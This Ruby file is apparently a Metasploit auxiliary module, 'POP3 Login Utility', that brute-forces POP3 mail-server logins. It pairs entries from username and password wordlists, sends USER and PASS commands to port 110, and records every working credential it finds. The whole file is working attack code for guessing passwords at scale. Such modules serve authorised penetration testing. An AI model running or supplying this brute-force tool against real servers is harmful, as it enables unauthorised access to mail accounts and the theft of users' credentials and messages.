# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize
  super(
    'Name'        => 'POP3 Login Utility',
    'Description' => 'This module attempts to authenticate to an POP3 service.',
    'Author'      =>
    [
      '==[ Alligator Security Team ]==',
      'Heyder Andrade <heyder[at]alligatorteam.org>'
    ],
      'References'     =>
    [
      ['URL', 'http://www.ietf.org/rfc/rfc1734.txt'],
      ['URL', 'http://www.ietf.org/rfc/rfc1939.txt'],
    ],
      'License'     => MSF_LICENSE
  )
  register_options(
    [
      Opt::RPORT(110),
      OptPath.new('USER_FILE',
        [
          false,
          'The file that contains a list of probable users accounts.',
          File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_users.txt')
        ]),
      OptPath.new('PASS_FILE',
        [
          false,
          'The file that contains a list of probable passwords.',
          File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_passwords.txt')
        ])
    ], self.class)
  end

  def target
    "#{rhost}:#{rport}"
  end

  def run_host(ip)
    begin
      print_status("Connecting to #{target}")
      each_user_pass do |user, pass|
        do_login(user, pass)
      end
    end
    rescue ::Rex::ConnectionError
    rescue ::Exception => e
      vprint_error("#{target} #{e.to_s} #{e.backtrace}")
  end

  def pop3_send(data=nil, con=true)
    begin
      @result=''
      @coderesult=''
      if (con)
        @connected=false
        connect
        select(nil,nil,nil,0.4)
      end
      @connected=true
      sock.put(data)
      @result=sock.get_once
    rescue ::Exception => err
      print_error("Error: #{err.to_s}")
    end
  end

  def do_login(user=nil,pass=nil)
    begin
      pop3_send(nil,true) # connect Only
      if @result !~ /^\+OK (.*)/
        print_error("POP3 server does not appear to be running")
        return :abort
      end

      vprint_status("#{target} - Trying user:'#{user}' with password:'#{pass}'")
      cmd = "USER #{user}\r\n"
      pop3_send(cmd,!@connected)
      if @result !~ /^\+OK (.*)/
        vprint_error("#{target} - Rejected user: '#{user}'")
        return :fail
      else
        cmd = "PASS #{pass}\r\n"
        pop3_send(cmd,!@connected)
        if @result !~ /^\+OK (.*)/
          vprint_error("#{target} - Failed login for '#{user}' : '#{pass}'")
          if (@connected)
            disconnect # Some servers disconnect the client after wrongs attempts
            @connected = false
          end
          return :fail
        else
          print_good("#{target} - SUCCESSFUL login for '#{user}' : '#{pass}'")
          report_auth_info(
            :host => rhost,
            :port => rport,
            :sname => 'pop3',
            :user => user,
            :pass => pass,
            :source_type => "user_supplied",
            :active => true
          )
          disconnect
          @connected = false
          return :next_user
        end
      end
      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end
end
